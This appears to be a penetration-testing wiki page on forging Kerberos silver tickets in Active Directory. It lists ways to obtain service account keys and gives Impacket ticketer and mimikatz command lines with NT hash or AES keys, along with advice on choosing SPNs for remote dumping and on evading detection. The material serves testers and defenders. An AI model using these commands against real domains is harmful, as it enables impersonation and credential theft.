In order to craft a silver ticket, testers need to find the target service account's RC4 key (i.e. NT hash) or AES key (128 or 256 bits). This can be done by capturing an NTLM response (preferably NTLMv1) and cracking it, by dumping LSA secrets, by doing a DCSync, etc.

"While the scope is more limited than Golden Tickets, the required hash is easier to get and there is no communication with a DC when using them, so detection is more difficult than Golden Tickets." ([adsecurity.org](https://adsecurity.org/?p=2011))
=== "UNIX-like"
    The Impacket script [ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) can create silver tickets.
    ```bash
    # Find the domain SID
    lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

    # with an NT hash
    python ticketer.py -nthash "$NT_HASH" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"

    # with an AES (128 or 256 bits) key
    python ticketer.py -aesKey "$AESkey" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"
    ```
    The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations
=== "Windows"
    On Windows, mimikatz can be used to generate a silver ticket with `kerberos::golden`. Testers need to carefully choose the right SPN type (cifs, http, ldap, host, rpcss) depending on the wanted usage.
    ```bash
    # with an NT hash
    kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

    # with an AES 128 key
    kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$serviceAccount_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

    # with an AES 256 key
    kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$serviceAccount_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
    ```
!!! note
    A great, stealthier, alternative to silver ticket is to abuse `S4U2self` in order to impersonate a domain user with local admin privileges on the target machine by relying on Kerberos delegation instead of forging everything.